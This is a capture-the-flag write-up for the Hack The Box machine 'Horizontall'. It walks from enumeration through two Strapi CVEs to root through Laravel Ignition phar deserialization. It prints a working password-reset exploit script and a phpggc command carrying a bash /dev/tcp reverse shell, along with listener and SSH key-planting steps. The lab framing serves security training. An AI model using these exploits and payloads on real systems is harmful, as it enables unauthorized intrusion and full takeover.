---
title:     "Hack The Box - Horizontall"
tags: [linux,easy,CVE,command injection,strapi,laravel,php,phpgcc]
categories: HackTheBox
---
[![info_card](/img/horizontall/info_card.png)](/img/horizontall/info_card.png)

Horizontall is an easy rated machine on HackTheBox created by [wail99](https://www.hackthebox.eu/home/users/profile/4005). To get user we will abuse 2 CVE's in a strapi application whichs result in a reverse shell on the machine. There we discover a laravel installation listening on localhost which is vulnerable to phar deserialization. Forwarding it to our machine we are able to exploit this to get a reverse shell as the root user.

# User

## Nmap

As usual we start our enumeration off with a nmap scan against all ports, followed by a script and version detection scan against the open ones.

`All ports`
```
$ sudo nmap -p-  -T4  10.129.193.59
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-28 19:44 GMT
Nmap scan report for 10.129.193.59
Host is up (0.052s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 85.01 seconds
```

`Script and version`
```
$ sudo nmap -p22,80 -sC -sV  10.129.193.59
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-28 19:47 GMT
Nmap scan report for 10.129.193.59
Host is up (0.027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```

## Strapi

From the 2 open ports http promises more success, so we add the leaked domain name to our `/etc/hosts` and open the page in our browser. Looking at the page it seems to be fully static with almost no functionality.

[![horizontall_home](/img/horizontall/horizontall_home.png)](/img/horizontall/horizontall_home.png)

Fuzzing for additional subdomains we can retrieve two other ones. `www` looks the same as the other page, `api-prod` is different though.

```
$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.horizontall.htb' -u http://horizontall.htb/ -fs 194

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 194
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20]
:: Progress: [114441/114441] :: Job [1/1] :: 1590 req/sec :: Duration: [0:01:15] :: Errors: 0 ::
```

### Password reset | CVE-2019-18818

Opening it in our browser it just displays a short welcome message.

[![api_welcome](/img/horizontall/api_welcome.png)](/img/horizontall/api_welcome.png)

Bruteforcing directories with gobuster we find a `/admin` directory which reveals a `strapi` login interface.

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://api-prod.horizontall.htb/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/28 20:19:24 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60]
/reviews              (Status: 200) [Size: 507]
/.                    (Status: 200) [Size: 413]
```

[![strapi_login](/img/horizontall/strapi_login.png)](/img/horizontall/strapi_login.png)

Looking for vulnerabilities in `strapi` there is a CVE which promises authentication bypass by resetting the password of a user. Looking at the [PoC](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/) for `CVE-2019-18818` we need a valid email to make it work. We can do this by checking the password reset functionality on the login. If we enter a likely invalid email it tells us the email does not exist.

[![fail_pw_reset](/img/horizontall/fail_pw_reset.png)](/img/horizontall/fail_pw_reset.png)

Testing the username admin with the domain found earlier there is no error though, indicating this email is valid.

[![succ_pw_reset](/img/horizontall/succ_pw_reset.png)](/img/horizontall/succ_pw_reset.png)

Now we just need to download the script from the PoC and run it with the email, url and new password we want to set on the user.

`resetpw.py`
```py
import requests
import sys
import json

args=sys.argv

if len(args) < 4:
    print("Usage: {} <admin_email> <url> <new_password>".format(args[0]))
    exit(-1)

email = args[1]
url = args[2]
new_password =  args[3]

s  =  requests.Session()

version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)

print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))

#Request password reset
print("[*] Sending password reset request...")
reset_request={"email":email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
s.post("{}/".format(url), json=reset_request)

#Reset password to
print("[*] Setting new password...")
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
r=s.post("{}/admin/auth/reset-password".format(url), json=exploit)

print("[*] Response:")
print(str(r.content))
```

```
$ python resetpw.py admin@horizontall.htb http://api-prod.horizontall.htb whatever
[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
[*] Sending password reset request...
[*] Setting new password...
[*] Response:
b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMTgzMDI4LCJleHAiOjE2MzI3NzUwMjh9.ES00z3EnbKK8iodAbp8XBsN2QrWiLJZCMMxIIXRe15Y","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'
```

After the script successfully completes we are now able to log into `strapi` as the `admin@horizontall.htb` user.

[![logged_in](/img/horizontall/logged_in.png)](/img/horizontall/logged_in.png)

### Command injection | CVE-2019-19609

There is another CVE affecting this version of `strapi`. Following this [PoC](https://bittherapy.net/post/strapi-framework-remote-code-execution/) we are able to abuse command injection in the `plugin` value of the  `/admin/plugins/install` functionality.

[![intercept_plugins](/img/horizontall/intercept_plugins.png)](/img/horizontall/intercept_plugins.png)

For this we first intercept an authenticated request with burp for a request with our JWT to build upon and start a ncat listener.

[![burp_jwt](/img/horizontall/burp_jwt.png)](/img/horizontall/burp_jwt.png)

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Next we rewrite the request to a similar formatting as the curl request in the blogpost before sending it. We instantly get a reverse shell back which we upgrade and fix the terminal size. Looking a bit around we can now already read the user flag.

[![revshell_burp](/img/horizontall/revshell_burp.png)](/img/horizontall/revshell_burp.png)

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.193.59.
Ncat: Connection from 10.129.193.59:60216.
bash: cannot set terminal process group (1797): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ export TERM=xterm
export TERM=xterm
strapi@horizontall:~/myapi$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

strapi@horizontall:~/myapi$ stty rows 55 cols 236
strapi@horizontall:~/myapi$ find / -name user.txt -ls 2>/dev/null
   272801      4 -r--r--r--   1 developer developer       33 Aug 28 19:01 /home/developer/user.txt
strapi@horizontall:~$ wc -c /home/developer/user.txt
33 /home/developer/user.txt
```

# Root

## Laravel phar deserialization | CVE-2021-3129

Looking for open ports on localhost we see port `8000` and `1337` being open next to mysql on `3306`. Connecting to 1337 it returns the same as the subdomain of the webserver. Checking `8000` though with curl it seems to host a laravel installation.

```
strapi@horizontall:~$ ss -ln | grep LIST
...[snip]...
tcp  LISTEN 0      128                                     127.0.0.1:8000                                           0.0.0.0:*
tcp  LISTEN 0      80                                      127.0.0.1:3306                                           0.0.0.0:*
tcp  LISTEN 0      128                                       0.0.0.0:80                                             0.0.0.0:*
tcp  LISTEN 0      128                                       0.0.0.0:22                                             0.0.0.0:*
tcp  LISTEN 0      128                                     127.0.0.1:1337                                           0.0.0.0:*
tcp  LISTEN 0      128                                          [::]:80                                                [::]:*
tcp  LISTEN 0      128                                          [::]:22                                                [::]:*
```

To take a better look at it we first generate an ssh keypair with `ssh-keygen`, copy the public key to `/opt/strapi/.ssh/authorized_keys` and connect with our private key to forward the port. On a new line we enter `~C`, which drops us into the ssh command console where we can enter our portforward.

```
$ ssh -i strapi strapi@horizontall.htb
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Aug 28 20:49:24 UTC 2021

  System load:  0.05              Processes:           201
  Usage of /:   83.0% of 4.85GB   Users logged in:     2
  Memory usage: 36%               IP address for eth0: 10.129.193.59
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 28 20:17:19 2021 from 10.10.14.68
$
$
ssh> -L:8001:127.0.0.1:8000
Forwarding port.
```

Browsing to port `8001` on localhost now we see the laravel installation.

[![laravel_home](/img/horizontall/laravel_home.png)](/img/horizontall/laravel_home.png)

Looking online for vulnerabilities we stumble accross this [blogpost](https://www.ambionics.io/blog/laravel-debug-rce). Testing if the conditions are met, we are able to provoke a stacktrace and prove that debug mode is enabled and `ignition` present.

[![laravel_stacktrace](/img/horizontall/laravel_stacktrace.png)](/img/horizontall/laravel_stacktrace.png)

We can now use this [PoC](https://github.com/ambionics/laravel-exploits) which belongs to the blogpost to exploit this. Along the exploit script we also need [phpgcc](https://github.com/ambionics/phpggc) to create our malicious `phar`.

First we generate the phar file with `phpggc`, specifying a reverse shell as payload and set up a `ncat` listener again.

```
$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "bash -c 'bash -i >&/dev/tcp/10.10.14.68/7575 0>&1'"
```

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Next we exectue the python script with our previously generated phar.

```
$ python3 laravel-ignition-rce.py http://localhost:8001/ /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
```

We almost instantly get a reverse shell back as the root user and are able to add the flag to our collection.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.193.59.
Ncat: Connection from 10.129.193.59:60260.
bash: cannot set terminal process group (11736): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# id
id
uid=0(root) gid=0(root) groups=0(root)
root@horizontall:/home/developer/myproject/public# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
```